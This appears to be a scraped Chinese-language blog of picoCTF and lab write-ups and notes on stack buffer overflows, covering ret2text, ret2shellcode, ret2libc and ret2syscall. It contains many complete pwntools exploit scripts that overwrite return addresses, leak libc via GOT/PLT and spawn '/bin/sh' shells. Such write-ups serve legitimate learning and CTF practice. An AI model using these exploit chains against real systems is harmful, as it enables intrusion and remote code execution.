62318)p.sendline(b&#x27;a&#x27;*20)p.interactive() buffer overflow 1题目描述 控制退货地址现在我们开始烹饪了！您可以溢出缓冲区并返回到程序中的 flag 函数。你可以在这里查看源代码。 解密 var_4 是什么？ 在汇编或反编译工具（如 IDA Pro）中，var_4 是一个由工具自动生成的名称，用于表示一个位于栈上的局部变量。它通常是原始C代码中没有明确命名的变量，或者是编译器为了优化或内部使用而创建的栈空间。 从图片中可以看到，var_4 位于 s 数组的下方（在栈帧中，局部变量通常从 EBP 往下分配）。 var_4 有多大？ 图片中 var_4 对应的汇编指令是 dd ?。 dd 在汇编中是 “Define Doubleword” 的缩写。在 32 位系统中，一个 Doubleword 是 4 字节。 因此，var_4 的大小是 4 字节。 所以垃圾字节要填充36+4+4&#x3D;44个字节 win是后门函数 填充它的地址 脚本1234from pwn import *p = remote(&quot;saturn.picoctf.net&quot;, 59895)p.sendline(b&#x27;a&#x27;*44+p32(0x080491F6))p.interactive() buffer overflow 2题目描述 控制返回地址和参数这一次，您需要控制您返回的函数的参数！您可以从此程序中获取标志吗？你可以在这里查看源代码 解密 s距离返回地址是6C+4个字节 要传参，32位是参数从右到左依次压入栈中 win的地址 gdb动调查看python wp.py 执行的函数列表 脚本1234567891011from pwn import *# 本地# ex = process(&#x27;./vuln&#x27;)# 远程p = remote(&#x27;saturn.picoctf.net&#x27;, 62974)payload = b&#x27;a&#x27;*112+p32(0x08049296)+p32(0)+p32(0xCAFEF00D)+p32(0xF00DF00D)p.sendline(payload)# p.interprint(p.recvall()) x-sixty-what题目描述 溢出 x64 代码在此之前的大多数问题是 32 位 x86。现在我们考虑 64 位 x86，它 只是有点不同！使缓冲区溢出，并将返回地址更改为 flag 函数。 下载源代码 。 解密 这一题我错了很久，最后发现考了堆栈平衡:crying_cat_face: 但是也学到了一些gdb调试获取信息的方法 gdb调试获得相关信息 readelf -s vuln显示所有函数的信息（在gdb调试之前） p flag：显示函数flag的信息 （gdb）disassemble vuln：找要填充的字节数（） 64位时是0x40+8 32位时是0x40+4 堆栈平衡同一个程序的每一个 call 指令执行时，rsp（栈指针）的绝对值不一定相同，但其对齐状态是保持一致的。 当 vuln 函数通过 ret 指令跳转到 flag 函数时，flag 函数的入口处 rsp (栈指针) 可能满足 rsp % 16 == 0 (即 16 字节对齐)。但是，flag 函数的序言 (prologue) 通常会 push rbp (将 rbp 压栈)，这会使 rsp 减去 8 字节，导致 rsp % 16 == 8 (8 字节不对齐)。 问题就出在这里：在执行任何 call 指令之前，rsp 必须是 16 字节对齐的。 所以该函数到flag之前要先到ret小工具 使用 ROPgadget (推荐)： 在终端中运行（确保你的 vuln 可执行文件在当前目录）： Bash 1ROPgadget --binary ./vuln --only &quot;ret&quot; 它会列出所有独立的 ret 指令地址。通常你可以选择其中一个地址最小的，或者你觉得“独立”的地址（例如，不在任何重要函数的中间）。0x0040101a 是一个非常常见的备选。 在 GDB&#x2F;pwndbg 中手动查找： 启动 GDB 调试 ./vuln，然后使用 search-pattern 命令查找 ret 指令的机器码 \\xc3： Code snippet 1search-pattern &#x27;\\xc3&#x27; 你也可以使用 disassemble &lt;section_start_address&gt;, &lt;section_end_address&gt; 来反汇编整个代码段，然后手动查找 ret。 直接看出堆栈不平衡 该函数是flag被调用函数输出flag，所以在flag函数中的第一个call的地方下断点 python 你的脚本文件名.py：运行脚本 info registers rsp：查看rsp的寄存器信息 看最后两位 0x48可以整除16，所以现在堆栈平衡了 脚本12345678910111213141516171819from pwn import *# p = process(&#x27;./vuln&#x27;)# gdb.attach(p, gdbscript=&#x27;b *0x08049370\\ncontinue&#x27;)p = remote(&quot;saturn.picoctf.net&quot;, 50442)# 之前找到的 flag 函数地址flag_address = 0x00401236 # 在你的二进制文件中找到一个 ret 小工具的地址# 假设你找到的是 0x0040101a，请替换为你在 GDB/ROPgadget 中找到的实际地址ret_gadget_address = 0x0040101a # 构建 payload：填充 + ret_gadget_address + flag_addresspayload = b&#x27;A&#x27; * (0x40 + 8) + p64(ret_gadget_address) + p64(flag_address)p.sendline(payload)print(p.recvall())","categories":[],"tags":[{"name":"WP","slug":"WP","permalink":"http://example.com/tags/WP/"}]},{"title":"初识栈溢出","slug":"初识栈溢出","date":"2025-07-05T04:06:13.000Z","updated":"2025-07-18T12:29:41.121Z","comments":true,"path":"2025/07/05/初识栈溢出/","permalink":"http://example.com/2025/07/05/%E5%88%9D%E8%AF%86%E6%A0%88%E6%BA%A2%E5%87%BA/","excerpt":"","text":"fun(a,b)调用过程入栈 （1）压入参数 根据调用约定，main函数作为调用者，首先需要将func函数的两个参数a,b压入栈中。 注意压入参数的顺序，首先压入b，接着压入a，也就是说，压入参数的顺序是从右到左。 （2）返回地址压栈 返回地址压栈。main函数为了让func函数调用后正常返回，需要将当前指令（call指令）的下一条指令的地址压入栈中 call指令包含两个步骤：main函数的下一条指令压栈；控制eip为func函数的第一条语句，eip存储着CPU将要执行的指令的地址 （3）func函数运行 func函数需要自己的内部运作空间。可以使用以下指令序列开辟空间：push ebp mov ebp,esp sub esp,28h 这个28h就是开辟的存储func函数的相关内存的空间 mov ebp,esp看似没有变化，但EBP 从“保存调用者基址”变为“当前函数的栈帧基址”。 （4）func函数的局部变量和参数 func函数有自己内部的运作空间，即func_ebp到func_esp 局部变量在编译之后会被表示为与ebp 不同的距离 v2被表示为ebp -18h，v3被表示为ebp -10h。 注意，这里的v2, v3和v4都是局部变量。参数的读取方式例子:第一个参数是ebp+8，第二个参数是ebp+12 因为调用约定，肯定有main_next和main_ebp在ebp的上方，故偏移是固定的，在返回地址main_next上面 然后，func函数返回。两个步骤：清除栈空间，返回到之前执行的指令（main_next）处。 (5)func函数返回步骤1:清除栈空间 每个函数清除栈空间时可以使用一条公用指令leave。 leave包含两个步骤： ①mov esp,ebp将栈顶设置为栈基，即将func_ebp到func_esp的内容全部出栈； ②pop ebp 将main_ebp的内容重新弹回ebp，使main函数的栈基址得到恢复 (6)func函数返回步骤2：返回之前执行的指令（main_next）处 每个函数返回时可以使用一条公用指令ret。ret包含一个步骤：将栈顶弹出到eip寄存器（即下一条指令的位置），达到恢复main函数执行顺序的 目的。 到这里，main函数的栈基址和下一条指令都得到了恢复，也就完成了整个func函数的调用。 Linux操作系统的保护 Arch:amd64-64-little： amd64即x86_64(CPU架构) 64即字长为64，返回地址在栈中占 8字节，32位是4字节） little表示小端序，如果是big则表示大端序。以数字0x12345678为例，小端序存储的是\\x78\\x56\\x34\\x12，大端序存储的是\\x12\\x34\\x56\\x78 RELRO：Partial RELRO: Partial RELRO和Full RELRO的区别可以简单理解为GOT写权限的区别，Partial RELRO相当于GOT可写，Full RELRO相当于GOT不可写。 NX：NX enabled: 如果开启了NX保护机制，那么w权限和x权限就是互斥的,即不存在既拥有写权限又拥有执行权限的段。这个保护机制是用来防止shellcode植入的。在gdb调试中，可以通过vmmap命令来查看每个段的权限。 PIE：No PIE（0x8048000） ret2text(覆盖返回地址)该函数内存在get漏洞 该函数泄露了后门函数 接着通过gets函数栈溢出将这个地址改为target，那么vulnfunc返回的时候，用ret指令取出栈顶的元素返回，就会返回到target这个函数 target函数中有system（”&#x2F;bin&#x2F;sh”）这个后门，类似于在Linux的终端直接调用&#x2F;bin&#x2F;sh。利用这种方式可以直接返回一个shell，进而得到目标主机的shell，拿到控制权。 找填充字节 直接从IDA中读出长度 s到vulnfunc的ebp的距离是108h，所以到main_next的距离是0x108+4 那个4是32位的ebp的空间 脚本1234567from pwn import *p = process(&quot;./ret2text&quot;)p.recvuntil(&quot;ret2text\\n&quot;)payload = b&#x27;a&#x27;* (0x108+4) + p32(0x0804850B)p.sendline(payload)p.interactive() ret2shellcode（覆盖返回地址到Shellcode）Shellcode是机器码格式的恶意代码，指的是用于完成某个功能的汇编代码，常用的功能是获取目标系统的shell。在栈溢出的基础上，我们一般都是向栈中写内容，所以要想执行Shellcode，就要求对应的二进制文件没有开启NX保护 printf(&quot;%p\\n&quot;, s)输出了S的缓冲区的位置 没有开启NX保护 所以可以向进程中写入一段Shellcode（利用w写权限），再执行这段Shellcode（利用x执行权限）。 脚本1234567891011from pwn import *context.arch = &quot;i386&quot;p = process(&quot;./ret2shellcode&quot;)#gdb.attach(p,&quot;b *0x08048593&quot;)p.recvuntil(b&quot;ret2shellcode\\n&quot;) # 修改为字节串target = int(p.recvuntil(b&quot;\\n&quot;,drop = True),16) # 修改为字节串sc = asm(shellcraft.sh())payload = sc+b&#x27;a&#x27; * (0x108 + 4-len(sc))+ p32(target) p.sendline(payload)p.interactive() context.arch = &quot;i386&quot;说明程序的架构，使用 asm() 函数将 shellcode (shellcraft.sh()) 汇编成机器码时，pwntools 需要知道目标架构是 32 位还是 64 位，以便生成正确的指令集。32 位和 64 位的指令是不同的。 target = int(p.recvuntil(b&quot;\\n&quot;,drop = True),16) 接收知道读取到&#x2F;n，(输出的缓冲区的地址)，转化为十六进制整数，且drop = True方便地清理你接收到的数据。只提取某个模式（比如一个地址、一个数字或一个特定的字符串）而不包含用于分隔或终止的字符（如换行符、空格、冒号等） sc = asm(shellcraft.sh())生成启动/bin/sh的机器码 payload = sc+b&#39;a&#39; * (0x108 + 4-len(sc))+ p32(target) 从右到左入栈，p32(target):覆盖返回地址，b’a’ * (0x108 + 4 - len(sc)):填充从sc结束位置到返回地址之间所有“无用”的栈空间。sc:当 sc位于缓冲区的起始位置。 ropNX 保护 (No-Execute): 它的唯一目的是阻止你在数据区域（比如栈和堆）执行代码。你可以把栈和堆想象成一块“只写数据，不能跑程序”的区域。 允许什么？ 允许你在栈上写数据（比如填充字符串 AAAA，或者一些地址）。 允许你修改寄存器的值。 允许你覆盖返回地址。 阻止什么？ 阻止你把自己的汇编代码（我们称之为 Shellcode）放在栈上，然后让程序去执行它。 ret2libc1（单个函数的rop来链）第一步，先看保护 get溢出 system函数存在,但参数不是&#x2F;bin&#x2F;sh system函数存在,并且程序中心存在bin&#x2F;sh字符串 所以可以把bin&#x2F;sh作为参数传入system函数中构造后门函数 要构造一个后门函数，先调用system函数，然后按照调用流程，参数（bin&#x2F;sh字符串所在的位置）入栈，返回地址入栈 payload的形式是**[垃圾填充] + [system函数地址] + [system返回地址] + [binsh字符串地址]** 脚本12345678910111213from pwn import *context.arch = &quot;i386&quot; # 强烈建议加上这一行p = process(&quot;./ret2libc1&quot;)#gdb.attach(p,&quot;b *0x08048595&quot;) # 调试时启用#elf = ELF(&quot;./ret2libc1&quot;)#system = elf.plt[&quot;system&quot;]binsh = 0x0804A028 # 确保这个地址确实包含 &quot;/bin/sh&quot; 字符串p.recvuntil(b&quot;ret2libc1\\n&quot;) payload = b&#x27;a&#x27; * (0x108 + 4)+ p32(0x080483D0)+p32(0)+p32(0x804A028)p.sendline(payload)p.interactive() 找到system函数位置 elf = ELF(&quot;./ret2libc1&quot;) system = elf.plt[&quot;system&quot;]直接找到systemd的入口 注意 [system返回地址] 不能乱写，后门函数执行结束后会返回这个地址，错误的地址会引发崩溃 1.elf.plt[&quot;exit&quot;] (最常用，推荐)： 作用：让 system(&quot;/bin/sh&quot;) 执行完毕后，程序能够干净地调用 exit() 函数并退出。这是最推荐的做法，因为它确保了程序的正常终止。 优点：稳定、可靠，不会导致崩溃。 获取方式：elf.plt[&quot;exit&quot;] (pwntools 会自动解析)。 2.0x0 或其他无效地址 (导致崩溃)： 作用：如果你只关心 system(&quot;/bin/sh&quot;) 是否被执行，而不关心程序是否崩溃，那么可以随便填。 优点：最简单。 缺点：程序会崩溃，这在实际攻防中通常是不希望看到的。有时调试时为了快速验证 system 是否被调用，可能会暂时使用。 ret2libc2(两个函数的rop链) 该题没有bin&#x2F;sh字符串 所以我们要自己去通过get构造 (1)func函数通过栈溢出修改返回地址为gets_addr,传入get()的参数，b作为get函数底色参数，即其从终端读取的数据要存入的地方 （) （2）get函数被调用后会为自己开辟空间，执行时再次通过栈溢出填入system函数的地址和参数，最后调用system执行构造好的后门函数 分析之后得到应该构造如下形式的payload 其中get()函数和sys函数的参数都是bss段，get()用来把bin&#x2F;sh写入bss段，sys和它构成后门函数 get写入bss段的内容需要从终端读取，所以之后还要为其发送一个“bin&#x2F;sh” Payload的形式是p32（gets_addr）+p32（system_addr）+p32（gets_p1）+p32（system_p1）。 开启了NX保护，写和运行不能同时实现，所以改变该函数的参数位置，所以把 /bin/sh）写入一个可写的内存区域。.bss 段是一个非常理想的选择，因为它： 可写 通常位于固定的地址（特别是在 没有开启 ASLR 的情况下）； 在程序运行期间未初始化的数据都存储在这里。 找bss地址 1.readelf readelf -S ret2libc2 2.gdb调试 gdb ./ret2libc2 info files 显示了bss段的始末位置 3.脚本中直接得到 elf.bss() 脚本12345678910111213from pwn import *p = process(&quot;./ret2libc2&quot;)gdb.attach(p,&quot;b *0x08048595&quot;)elf=ELF(&quot;./ret2libc2&quot;)sys=elf.plt[&quot;system&quot;]get=elf.plt[&quot;gets&quot;]bss=elf.bss()payload=b&#x27;a&#x27;*(0x108+4)payload+=p32(get)+p32(sys)+p32(bss)+p32(bss)p.sendline(payload)p.sendline(&quot;/bin/sh&quot;)p.interactive() gdb调试检查是否成功写入 c一下运行到下断点位置 这个时候第一个get已经实现，payload已经传入了 下一步会进入我们传进去的get中 get 和system函数都执行结束后 x/s 0x0804a040发现bss内存入了bin&#x2F;sh ret2libc2(多个函数的rop链)假设一个二进制文件里仅有read函数，read函数有三个参数（fd，addr和length） 这是按照两个rop链写出的payload填补形式 函数read因为拥有三个参数，所以相应地在栈上需要有三个块的空间。这时，system函数的第一个参数的位置就会和read函数的第二个参数的位置冲突，导致无法将system函数的第一个参数放置在栈上。不方便直接覆盖，因为read的参数限制比较多 所以这种情况就可以用pop&#x2F;ret进行 注意选取的基本原则：有几个参数就用几个pop指令，比如调用完gets函数之后，因为gets函数只有一个参数，所有可以将gets函数的返回地址改为0x0804862F，即只执行一个pop指令弹出参数之后就是ret指令；比如read函数有三个参数，那么就找0x0804862D这个位置，因为这个位置的指令是3个pop指令加上一个ret指令 如何寻找若干个pop指令跟着ret指令 ROPgadget --binary ret2libc2 --only &quot;pop|ret&quot; (ROPgadget用于查找用来攻击的可执行代码片段，而readlf是程序的整体结构和内存布局) 脚本12345678910111213141516from pwn import *p = process(&quot;./ret2libc2&quot;)#gdb.attach(p,&quot;b *0x8048595&quot;)elf=ELF(&quot;./ret2libc2&quot;)sys=elf.plt[&quot;system&quot;]get=elf.plt[&quot;gets&quot;]bss=elf.bss()pop1_ret=0x804861bpayload=b&#x27;a&#x27;*(0x108+4)payload+=p32(get)+p32(pop1_ret)+p32(bss)payload+=p32(sys)+p32(pop1_ret)+p32(bss)p.sendline(payload)p.sendline(&quot;/bin/sh&quot;)p.interactive() payload += p32(get) + p32(pop1_ret) + p32(bss): 盘子比喻 准备 ROP 链（堆叠盘子）： 你在内存的栈上，从下往上（也就是从低地址往高地址，因为栈是向下增长的），像堆叠盘子一样放了一系列地址。 假设你的 ROP 链片段是：A (get地址), B (pop ebp; ret地址), C (bss地址)。 栈上的盘子： 1234... (其他数据)[ C 盘子 (bss地址) ] &lt;-- 位于栈上较高位置[ B 盘子 (pop ebp; ret地址) ][ A 盘子 (get地址) ] &lt;-- 位于栈上较低位置，最先被程序“看到” 当程序返回时，会先“拿起”最上面的盘子（A）。 执行 get 函数（使用 A 盘子）： 程序因为栈溢出被劫持，它会跳到 get 函数的地址（A 盘）。 get 函数开始执行。它需要一个参数，也就是一个内存地址来存放它读取的数据。 get 函数会去“看”它自己返回地址上方的“盘子”，也就是 C 盘子 (bss地址)。 所以，C 盘子 (bss地址) 被 get 函数当作了它的参数，get 会将你通过 p.sendline(&quot;/bin/sh&quot;) 发送的数据写入到 C 盘子 所指示的内存区域（即 bss 段）。 get 函数执行完毕后，它需要“返回”。它会从栈上取回它的返回地址，也就是紧邻其下的 B 盘子 (pop ebp; ret地址)。 执行 pop ebp; ret gadget（使用 B 盘子）： 程序跳转到 B 盘子 (pop ebp; ret地址)。 现在，B 盘子 内部的指令开始执行： pop ebp： 这条指令会“拿起”栈顶的那个盘子。此时栈顶就是 C 盘子 (bss地址)。所以，C 盘子 (bss地址) 会被弹出并放入 ebp 寄存器。这个操作相当于把 C 盘子 从栈中拿走了。 ret： 这条指令会“拿起”栈中现在最上面的盘子（也就是 C 盘子 被拿走后暴露出的下一个盘子），并跳转到那个盘子上的地址。这个盘子就是你 ROP 链中的下一个函数地址（例如 sys 函数的地址）。 ret2syscall(底层系统调用静态) 开启了NX保护，但我们可以通过精心构造ROP链实现跳转，而不改变数据段的数值 除此之外没有上面有效的东西了,整个二进制文件中都没有system函数 所以自己为寄存器赋值以构造后门函数。且调用的int 0x80要放在最上面，调用时，从下往上开始执行，执行到调用指令时，该函数的参数必须准备好、 根据命令找到&#x2F;bin&#x2F;sh字符段 和int 0x80的调用命令以及需要的pop|ret命令 脚本12345678910111213141516171819from pwn import *p = process(&quot;./ret2syscall&quot;)#gdb.attach(p,&quot;b *0x080488ED&quot;)binsh=0x080ea068int_0x80=0x0806ce55pop_eax_ret = 0x080b8526pop_edx_ecx_ebx_ret = 0x0806f200eax = 11 # #define __NR_ execve 11ebx = binshecx = 0edx = 0payload=b&#x27;a&#x27;*(0x108+4)payload+=p32(pop_eax_ret)+p32(eax)payload+=p32(pop_edx_ecx_ebx_ret)+p32(edx)+p32(ecx)+p32(ebx)payload+=p32(int_0x80)p.sendline(payload)p.interactive() 编译知识（1）静态编译。编译器在编译可执行文件的时候，会提取可执行文件需要调用的对应的动态链接库（.so）中的部分，并链接到可执行文件中 去，使可执行文件在运行的时候不依赖于动态链接库。 （2）动态编译。动态编译的可执行文件需要附带一个动态链接库，在执行时，需要调用其对应动态链接库中的命令。所以，其优点一方面是 缩小了可执行文件的大小，优点加快了编译速度，节省了系统资源。缺点一方面是哪怕很简单的程序，只要用到了链接库中的一两条命令，也要附带一个庞大的链接库；另一方面是如果其他计算机上没有安装对应的运行库，则经过动态编译的可执行文件就不能运行。 静态编译的优缺点与动态编译正好相反。 静态编译可以简单理解为将动态链接库中的代码拷贝出来放入对应的二进制文件里。 寄存器 在32位系统中，通过int 0x80指令触发系统调用。其中，EAX寄存器用于传递系统调用号，参数按顺序赋值给EBX、ECX、EDX、ESI、 EDI、EBP这6个寄存器。 在64位系统中，使用syscall指令来触发系统调用，同样使用EAX（RAX）寄存器传递系统调用号，RDI、RSI、RDX、RCX、R8、R9 这6个寄存器用来传递参数。 eg:read（0,buf,0x100） 32位时，eax&#x3D;3（#define__NR_read 3）;ebx&#x3D;0;ecx&#x3D;buf;edx&#x3D;0x100;，设置完每个寄存器的值之后，再执行int 0x80指令，就会执行对应的read（0,buf,0x100）。实际上，最后还会进入内核态执行。 64位时，rax&#x3D;0（#define__NR_read 0）;rdi&#x3D;0;rsi&#x3D;buf;rdx&#x3D;0x100，设置完每个寄存器的值之后，再执行syscall指令，就会执行对应的read（0,buf,0x100）。 也是进入内核态执行。 如果想要完成Get shell 32位时，：eax&#x3D;11（#define__NR_execve 11）;ebx&#x3D;”&#x2F;bin&#x2F;sh”;ecx&#x3D;0;edx&#x3D;0;（NULL实际上就是0），设置完每个寄存器的值之后，再执行int 0x80指令，就会执行对应的execve（”&#x2F;bin&#x2F;sh”,NULL,NULL）。 64位时，rax&#x3D;59（#define__NR_execve 59）;rdi&#x3D;”&#x2F;bin&#x2F;sh”;rsi&#x3D;0;rdx&#x3D;0; 在ida中红色为外部函数，白色为内部函数 静态编译的二进制文件全为内部函数 ret2libc3脚本123456789101112131415161718192021222324252627282930313233343536373839from pwn import *from LibcSearcher import LibcSearcherp = process(&quot;./ret2libc3&quot;)#gdb.attach(p, &quot;b *0x0804854C&quot;)elf = ELF(&quot;./ret2libc3&quot;)gets_got = elf.got[&quot;gets&quot;]puts_plt = elf.plt[&quot;puts&quot;]main_addr = 0x0804854E# 泄露 gets 地址p.recvuntil(&quot;ret2libc3\\n&quot;)payload1 = b&quot;a&quot; * 0x108 + b&quot;junk&quot;payload1 += p32(puts_plt) + p32(main_addr) + p32(gets_got)p.sendline(payload1)# 获取泄露地址leak_addr = u32(p.recv(4))# 用 LibcSearcher 查libc = LibcSearcher(&quot;gets&quot;, leak_addr)#LibcSearcher 会根据你提供的函数名和地址，去匹配已知的 libc 数据库libc_base = leak_addr - libc.dump(&quot;gets&quot;)#libc.dump(&quot;gets&quot;)是gets 函数在 libc 中的偏移（相对于 libc 基地址）system_addr = libc_base + libc.dump(&quot;system&quot;)binsh_addr = libc_base + libc.dump(&quot;str_bin_sh&quot;)log.success(&quot;libc_base: &quot; + hex(libc_base))log.success(&quot;system: &quot; + hex(system_addr))log.success(&quot;/bin/sh: &quot; + hex(binsh_addr))#输出这个计算出的地址，便于检查# 第二次攻击p.recvuntil(&quot;ret2libc3\\n&quot;)payload2 = b&quot;a&quot; * 0x108 + b&quot;junk&quot;payload2 += p32(system_addr) +p32(0) + p32(binsh_addr)p.sendline(payload2)p.interactive() payload1 += p32(puts_plt) + p32(main_addr) + p32(gets_got) 调用put函数泄露gets函数的实际地址，并且返回main函数，再次利用got漏洞 它内部使用的是 预定义符号名 ，比如： &quot;system&quot; &quot;gets&quot; &quot;printf&quot; &quot;str_bin_sh&quot; （就是你要找的 /bin/sh） 这些名字不是随便写的，是预先在 libc 数据库中定义好的符号名称。 脚本执行后会显示 这是因为用libc &#x3D; LibcSearcher(“gets”, leak_addr)进行选择适合的libc库，但不同版本的libc.so文件的变化不大，一个函数的地址约束不够严格，所以会显示多个libc版本供选择 解决多个libc.so版本供选择1.多个约束条件 哪些符号最稳妥 这是个很重要的问题： 为什么泄露 gets &#x2F; puts &#x2F; printf，不泄露 malloc &#x2F; exit &#x2F; system 呢？ 理由： 符号 稳妥程度 原因 puts 👍 几乎每个 libc 里都有，偏移独特 printf 👍 常见，偏移独特 gets 👍（但是 glibc2.28+ 被废弃了） read 👍 核心 IO，存在且稳定 write 👍 和 read 对应 system 👎 很常用，但是有的 libc 把它静态链接了或者位置很常见 exit 👎 偏移较小且常见，不建议用 __libc_start_main 👍 非常稳妥，通常不会冲突 因此建议你泄露的优先级是： 1puts &gt; printf &gt; read &gt; write &gt; __libc_start_main &gt; gets 理想状态下，你一次性泄露三个符号，比如： 123puts(gets@got);puts(puts@got);puts(printf@got); 然后用三个符号去查库，几乎100%唯一 但是 当程序编译时，只有真正被调用的外部库函数才会被链接，并且它们才会在 GOT 表里有条目。 而你的目标程序 ./ret2libc3 里： 12bash复制编辑gets, puts 有用到printf 没用到 所以：只能有两个约束条件 123css复制编辑elf.got[&quot;gets&quot;] ✅ 存在elf.got[&quot;puts&quot;] ✅ 存在elf.got[&quot;printf&quot;] ❌ 报错 脚本 1234567891011121314151617181920212223242526272829303132333435363738394041from pwn import *from LibcSearcher import LibcSearcherp = process(&quot;./ret2libc3&quot;)elf = ELF(&quot;./ret2libc3&quot;)gets_got = elf.got[&quot;gets&quot;]puts_plt = elf.plt[&quot;puts&quot;]puts_got = elf.got[&quot;puts&quot;]#puts的got表main_addr = 0x0804854Ep.recvuntil(&quot;ret2libc3\\n&quot;)payload1 = b&quot;a&quot; * 0x108 + b&quot;junk&quot;payload1 += p32(puts_plt) + p32(main_addr) + p32(gets_got)payload1 += p32(puts_plt) + p32(main_addr) + p32(puts_got)#输出puts的实际位置p.sendline(payload1)leak_addr = u32(p.recv(4))leak_puts = u32(p.recv(4))#接收其位置libc = LibcSearcher(&quot;gets&quot;, leak_addr)libc.add_condition(&quot;puts&quot;, leak_puts)#增加puts的位置作为约束条件libc_base = leak_addr - libc.dump(&quot;gets&quot;)system_addr = libc_base + libc.dump(&quot;system&quot;)binsh_addr = libc_base + libc.dump(&quot;str_bin_sh&quot;)log.success(&quot;libc_base: &quot; + hex(libc_base))log.success(&quot;system: &quot; + hex(system_addr))log.success(&quot;/bin/sh: &quot; + hex(binsh_addr))p.recvuntil(&quot;ret2libc3\\n&quot;)payload2 = b&quot;a&quot; * 0x108 + b&quot;junk&quot;payload2 += p32(system_addr) +p32(0) + p32(binsh_addr)p.sendline(payload2)p.interactive() 但是这个我尝试过对这个题目来说还是约束条件太少，但是由于这个题目调用函数比较少，所以可以作为约束的函数也比较少 1）GOT。GOT是全局偏移量表（Global Offset Table），用于存储外部函数在内存中的确切地址。GOT存储在数据段（Data Segment）内，可以在程序运行过程中被修改。 2）PLT是程序链接表（Procedure Linkage Table），用来存储外部函数的入口点（entry），换言之，程序会到PLT中寻找外部函数的地址。PLT存储在代码段（Code Segment）内，在运行之前就已经确定并且不会被修改。 简单来讲，GOT是个数据表，存储的是外部函数的地址，具有读写权限（在FULL RELRO保护机制开启的时候，没有读写权限）；PLT是外部函数的入口表，存储的是每个外部函数的代码，具有执行权限。 尽管 libc 的加载地址是随机的（ASLR），但在libc不同的情况下 libc 内部所有函数相对于 libc 基地址的偏移量是固定不变的。这是 ret2libc 攻击的基础。 实际地址&#x3D;基址+偏移 当你写了一个程序使用了 libc 中的函数（如 printf），这个函数的具体地址在编译时是未知的，因为 libc 被加载的位置会因 ASLR（地址空间布局随机化）而变化。 函数名称 内容 PLT 提供跳转桩代码 GOT 存放实际函数地址 当你的程序调用 printf() 时，实际上调用的是 PLT 中的 printf@plt，PLT 再通过 GOT 查找真正的地址。 🔁 总结对比（重点来了！） 为什么可以用 system@plt？ 因为它是 libc 中system()函数的“入口大门”，进去以后就会自动跳过去，不用你自己去找路。 为什么不用 GOT？ 因为我们不是要读取地址，而是要调用函数。PLT 就像按钮，按下去就能运行函数，不需要先看地址。 什么时候必须用 GOT？ 当你在远程服务器上不知道 libc 版本和地址时，必须先通过 GOT 泄露一个函数地址，才能计算出其他函数的地址。 什么时候能直接用 PLT？ 当你在本地调试、libc 是固定的，而且程序没开 PIE（地址不随机化）的时候，就可以直接调用 PLT。 ret2libc3 可以用 ret2syscall 的方法来攻击，只需要找到特定的、固定的 ROP gadgets 和 int 0x80 指令。 选择 ret2libc 的方法，通常是因为 system() 函数提供的便捷性更高，虽然多了一步 libc 泄露的开销，但在大多数情况下，这种方法更“简单”且更“通用”。 在实际的 CTF 比赛中，攻击者会根据目标程序的具体情况（是否有易于利用的 int 0x80、是否有足够的 gadgets、是否有 &quot;/bin/sh&quot; 字符串等）来选择最简单、最可靠的攻击方法。 ret2libc3 之所以需要泄露 libc 地址，是因为它依赖于调用 libc 库中（而非程序自身）的封装函数（如 system()），而这些 libc 函数的地址会受到 ASLR (地址空间布局随机化) 的影响而随机化。ret2syscall 能够不泄露 libc 地址，是因为它依赖于程序自身或加载到固定地址的共享库中的 ROP gadget 和 int 0x80 指令，这些地址在没有 PIE (位置无关可执行文件) 的情况下是固定的。 ret2libc3_x6432位程序的payload都是在返回地址之后加上参数，而64位是在返回地址之前把参数放入寄存器中 64位程序和32位程序的ROP技术的不同点在于参数传递的方式不同。64位程序的前6个参数是rdi,rsi,rdx,rcx,r8,r9，后续参数才会放在栈上，所以64位程序的ROP和ret2syscall几乎是一样的，都是先控制寄存器，再跳转到对应的函数进行操作。 脚本1234567891011121314151617181920212223242526272829303132333435363738394041424344454647from pwn import *from LibcSearcher import LibcSearcherp = process(&quot;./ret2libc3_x64&quot;)#gdb.attach(p,&quot;b *0x00000000004006F1&quot;)elf = ELF(&quot;./ret2libc3_x64&quot;)gets_got = elf.got[&quot;gets&quot;]puts_plt = elf.plt[&quot;puts&quot;]main_addr = elf.symbols[&quot;main&quot;]rdi = 0x0000000000400783 # pop rdi ; retret_gadget = 0x0000000000400784 # Assuming this is a &#x27;ret&#x27; instruction for stack alignmentp.recvuntil(b&quot;ret2libc3_x64\\n&quot;)payload1 = b&quot;a&quot; * (0x108)payload1 += p64(rdi) + p64(gets_got)payload1 +=p64(puts_plt)+p64(main_addr)p.sendline(payload1)leak_addr = u64(p.recv(6).ljust(8, b&quot;\\x00&quot;))libc = LibcSearcher(&quot;gets&quot;, leak_addr)libc_base = leak_addr - libc.dump(&quot;gets&quot;)#libc.address = libc_base#我感觉没什么用log.success(&quot;libc_base:&quot; + hex(libc_base))system = libc_base + libc.dump(&quot;system&quot;)binsh = libc_base + libc.dump(&quot;str_bin_sh&quot;)# ====== 修改开始：添加 GDB 动态下断点 ======gdb.attach(p, f&#x27;b *&#123;hex(system)&#125;&#x27;) # 在 system 地址处下断点# ====== 修改结束 ======p.recvuntil(b&quot;ret2libc3_x64\\n&quot;)payload2 = b&quot;a&quot; * (0x108)payload2 += p64(rdi) + p64(binsh)payload2 += p64(ret_gadget)payload2 += p64(system)p.sendline(payload2)p.interactive() 对于payload2由于考虑堆栈平衡，所以会有两个ret指令放在一起 payload2 +&#x3D; p64(rdi) + p64(binsh)payload2 +&#x3D; p64(ret_gadget) 堆栈平衡64位程序中，函数调用前，栈指针（rsp）必须是 16 字节对齐的 32位程序中，函数调用前后，栈指针 esp 的值应该保持不变（32位一般不考虑堆栈平衡） ✅ 一、静态分析：计算栈偏移 为了栈对齐（避免崩溃），你构造的 payload 中“除了填充部分”之外的内容（即 gadget 和参数）最好是一个偶数块（8 字节为一块） ✅ 二、动态调试：使用 GDB 查看 rsp 的值 对于这一题来说，在确定了libc.so库和libc基址之后，在system函数内在system处设置断点 之后运行这个脚本 这里就选择好libc版本了 之后动态调试查看 在刚进入这个函数的第一步，就已经处于不平衡的状态了 因为它在调用前是栈平衡，调用时会有push rsp 指令改变 查看栈顶的命令是 1info register rsp 注意对于构造的rop链 填充返回地址 填充的返回地址 效果 main() 让程序重新运行 main 函数（可重复利用） _start 重新开始整个程序 shellcode 地址 如果你想继续执行自己的代码 exit()或_exit() 安全退出程序 返回地址写0的时候偶尔会报错 返回地址处理🎯 2. 32 位 vs 64 位地址 项目 32 位 64 位 地址长度（位） 32 位 &#x3D; 4 字节 64 位 &#x3D; 8 字节 Python 里的表示 0xdeadbeef 0x7fffdeadbeef 